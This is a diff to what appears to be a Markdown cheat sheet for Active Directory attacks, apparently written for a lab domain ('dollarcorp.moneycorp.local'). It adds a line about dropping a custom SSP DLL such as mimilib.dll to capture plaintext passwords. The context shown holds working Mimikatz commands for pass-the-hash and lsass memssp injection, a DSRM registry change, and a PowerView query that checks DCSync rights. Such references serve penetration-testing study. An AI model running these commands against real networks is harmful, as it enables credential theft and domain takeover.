@@ -74,6 +74,7 @@ C:> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAd
 C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
 ```
 ### SSP (Security Support Provider)
+We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!
 - Inject into `lsass` using Mimikatz
 ```powershell
 C:> Invoke-Mimikatz -Command '"misc::memssp"'
@@ -127,7 +128,7 @@ C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -P
 ```
 ##### DCSync
 ```powershell
-# Check if a user has DCSync rights. Gives nothing if no rights and
+# Check if a user has DCSync rights. Gives nothing if no rights 
 C:> Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<user>"}
 
 # DCSync rights on Domain
